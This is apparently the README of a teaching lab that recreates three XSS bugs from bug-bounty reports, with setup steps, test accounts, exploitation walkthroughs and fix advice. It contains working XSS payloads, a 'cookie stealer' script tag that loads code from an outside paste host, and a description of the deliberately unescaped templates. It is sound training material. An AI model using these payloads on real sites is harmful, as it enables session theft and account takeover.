# XSS Vulnerability Lab

A hands-on lab environment based on real bug bounty reports demonstrating three different Cross-Site Scripting (XSS) vulnerabilities.

## ⚠️ Warning

**This lab contains intentionally vulnerable code for educational purposes only. DO NOT deploy this in any production environment or expose it to the internet.**

## Overview

This lab recreates three XSS vulnerabilities from real bug bounty reports:

1. **Stored XSS in Migration Title** (Report #2553454)
   - Account takeover through stored XSS in migration title field
   - Impact: Low-privileged users can inject scripts that execute when other users view migrations

2. **Stored XSS in Profile Name** (Report #2996005)
   - Stored XSS in profile name field leading to account takeover
   - Impact: Malicious scripts execute when victim logs in or views profile

3. **Reflected XSS in URL Parameter** (Report #2994788)
   - Reflected XSS in help/self-signup page
   - Impact: Attacker-controlled JavaScript execution via URL parameters

## Setup Instructions

### Prerequisites

- Python 3.7 or higher
- pip (Python package manager)

### Installation

1. Clone the repository:
```bash
git clone https://github.com/yourusername/xss-lab.git
cd xss-lab
```

2. Create a virtual environment (recommended):
```bash
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

3. Install dependencies:
```bash
pip install -r requirements.txt
```

4. Run the application:
```bash
python app.py
```

Or use the convenience script:
```bash
chmod +x run.sh
./run.sh
```

5. Access the lab in your browser:
```
http://localhost:5000
```

## Test Accounts

The lab comes with pre-configured test accounts:

| Username | Password | Role |
|----------|----------|------|
| `migration_coord` | `coord123` | Migration Coordinator |
| `victim` | `victim123` | Regular User |
| `admin` | `admin123` | Administrator |

## Lab Structure

### Vulnerable Endpoints

1. **Migrations Page** (`/migrations`)
   - Create migrations with a title field vulnerable to stored XSS
   - View all migrations (XSS executes when viewing)

2. **Profile Page** (`/profile`)
   - Edit profile name (vulnerable to stored XSS)
   - Alternative API endpoint: `POST /Profile/userProfileEdit`

3. **Help Page** (`/help`)
   - Reflected XSS via `q`, `url`, `redirect`, `page`, or `help.html` query parameters
   - Iframe injection via `help.html` parameter (supports `javascript:` protocol)

4. **Self-Signup Page** (`/Self-Signup/en_US/index.html`)
   - Reflected XSS via `url` query parameter
   - Iframe injection support

## Exploitation Examples

### Vulnerability 1: Stored XSS in Migration Title

1. Log in as `migration_coord` / `coord123`
2. Navigate to `/migrations`
3. Create a new migration with this payload in the title:
```html
<script>alert('XSS')</script>
```
4. Log in as `victim` / `victim123`
5. View the migrations - the script will execute

**Cookie Stealer Payload:**
```html
<script src=https://nopaste.net/aVBd3wK08b></script>
```

### Vulnerability 2: Stored XSS in Profile Name

1. Log in as any user
2. Navigate to `/profile`
3. Update profile name with this payload:
```html
xx"><svg/onload=confirm(1)>
```
4. Log out and log back in - the script executes on login

**Alternative Method (API):**
```bash
curl -X POST http://localhost:5000/Profile/userProfileEdit \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d "name=<script>alert('XSS')</script>"
```

### Vulnerability 3: Reflected XSS in URL Parameter

1. **Search Parameter:**
```
http://localhost:5000/help?q=<script>alert('XSS')</script>
```

2. **Iframe Injection (JavaScript Protocol):**
```
http://localhost:5000/help?help.html=javascript:confirm(1)
```

3. **Iframe Injection (External URL):**
```
http://localhost:5000/help?help.html=https://shorturl.at/w82nn
```

4. **Self-Signup Endpoint:**
```
http://localhost:5000/Self-Signup/en_US/index.html?url=javascript:confirm(1)
```

5. The payload will be reflected and executed in the page

## Learning Objectives

By completing this lab, you will:

- Understand the difference between stored and reflected XSS
- Learn how XSS vulnerabilities can lead to account takeover
- Practice identifying vulnerable input points
- Create and test XSS payloads
- Understand the impact of XSS vulnerabilities
- Learn about real-world bug bounty report scenarios

## Security Notes

### What Makes These Vulnerable?

1. **No Input Sanitization**: User input is directly rendered without encoding
2. **Use of `|safe` filter**: Jinja2's `safe` filter bypasses HTML escaping
3. **Direct Parameter Reflection**: URL parameters are reflected without validation

### How to Fix (For Reference)

1. **Input Validation**: Validate and sanitize all user input
2. **Output Encoding**: Always encode user input when rendering (remove `|safe` filters)
3. **Content Security Policy**: Implement CSP headers to mitigate XSS impact
4. **Use Framework Features**: Use Flask's built-in escaping or Jinja2's auto-escaping

## Features

- **Three Real-World XSS Vulnerabilities**: Based on actual bug bounty reports
- **Solution Pages**: Detailed explanations and payloads for each lab
- **Reset Functionality**: Clear all saved XSS payloads with one click
- **Realistic Web App**: Vulnerable pages look like legitimate applications
- **Educational Content**: Step-by-step guides and learning objectives

## File Structure

```
xss-lab/
├── app.py                    # Main Flask application with vulnerabilities
├── requirements.txt          # Python dependencies
├── README.md                 # This file
├── LICENSE                   # MIT License
├── run.sh                    # Quick start script
├── .gitignore                # Git ignore rules
├── templates/                # HTML templates
│   ├── base.html             # Base template with styling and navigation
│   ├── index.html            # Home page with lab selection
│   ├── login.html            # Login page
│   ├── dashboard.html        # User dashboard
│   ├── migrations.html       # Vulnerable migrations page (Lab 1)
│   ├── profile.html          # Vulnerable profile page (Lab 2)
│   ├── help.html             # Vulnerable help page (Lab 3)
│   ├── self_signup.html      # Vulnerable self-signup page (Lab 3)
│   ├── home.html             # Home page for testing
│   ├── solution_1.html       # Solution page for Lab 1
│   ├── solution_2.html       # Solution page for Lab 2
│   └── solution_3.html       # Solution page for Lab 3
└── lab.db                    # SQLite database (created on first run, gitignored)
```

## Troubleshooting

### Port Already in Use

If port 5000 is already in use, modify `app.py`:
```python
app.run(debug=True, host='0.0.0.0', port=8080)  # Change port number
```

### Database Issues

Delete `lab.db` and restart the application to reset the database:
```bash
rm lab.db
python app.py
```

## Reset Functionality

The lab includes a reset button in the navigation bar that allows you to:
- Clear all saved migrations (removes stored XSS payloads from Lab 1)
- Reset all profile names to defaults (removes stored XSS from Lab 2)
- Start fresh without manually clearing the database

Simply click the "Reset App" button and confirm to clear all XSS payloads.

## References

This lab is based on real bug bounty reports:
- Report #2553454: Account take over through Stored XSS vulnerability
- Report #2996005: Stored XSS on Profile/userProfile
- Report #2994788: Reflected XSS on Active Payment page

## Author

**zack0x01**

- 🎥 [YouTube](https://www.youtube.com/@zack0x01)
- 📷 [Instagram](https://www.instagram.com/zack0x01)
- 🐦 [Twitter](https://twitter.com/zack0x01)
- 🎓 [Bug Bounty Course](https://lureo.shop)

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

⚠️ **WARNING**: This lab contains intentionally vulnerable code for educational purposes only. DO NOT deploy this in any production environment or expose it to the internet.

## Contributing

Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://github.com/yourusername/xss-lab/issues).

## Disclaimer

This software is provided for educational purposes only. The authors and contributors are not responsible for any misuse or damage caused by this program. Use responsibly and only in controlled, isolated environments.

